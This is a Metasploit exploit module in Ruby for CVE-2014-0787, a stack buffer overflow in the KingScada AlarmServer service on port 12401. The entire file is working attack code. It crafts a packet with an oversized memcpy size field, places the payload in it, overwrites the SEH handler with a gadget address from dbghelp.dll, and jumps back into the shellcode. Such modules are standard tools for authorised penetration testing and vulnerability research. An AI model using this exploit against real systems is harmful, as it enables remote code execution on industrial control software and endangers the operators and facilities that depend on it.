require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'KingScada AlarmServer Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack based buffer overflow found in
				KingScada < 3.1.2.13. The vulnerability is triggered when 
				sending a specially crafted packet to the 'AlarmServer' 
				(AEserver.exe) service listening on port 12401. During the
				parsing of the packet the 3rd dword is used as a size value
				for a memcpy operation which leads to an overflown stack buffer
			},
			'Author'         => [ 'James Fitts' ],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'CVE', '2014-0787' ],
					[ 'ZDI', '14-071' ],
					[ 'URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-14-098-02' ]
				],
			'Privileged'     => false,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 1000,
					'BadChars' => "\x00\x0a\x0d\x20",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[
						'Windows XP SP3 EN / WellinTech KingScada 31.1.1.4', 
							{
								# dbghelp.dll
								# pop esi/ pop edi/ retn
								'ret' => 0x02881fbf,
							} 
					],
				],
			'DefaultTarget' => 0,
			'DisclosureDate' => 'Apr 10, 2014'))

		register_options([Opt::RPORT(12401)], self.class)
	end

	def exploit
		connect

		p = payload.encoded

		buf = make_nops(5000)
		buf[0, 4] = [0x000004d2].pack('V')
		buf[4, 4] = [0x0000007b].pack('V')
		buf[8, 4] = [0x0000133c].pack('V')	# size for memcpy()
		buf[1128, p.length] = p
		buf[2128, 8] = generate_seh_record(target['ret'])
		buf[2136, 5] = "\xe9\x4b\xfb\xff\xff"	# jmp $-1200

		print_status("Trying target #{target.name}...")

		sock.put(buf)

		handler
		disconnect
	end

end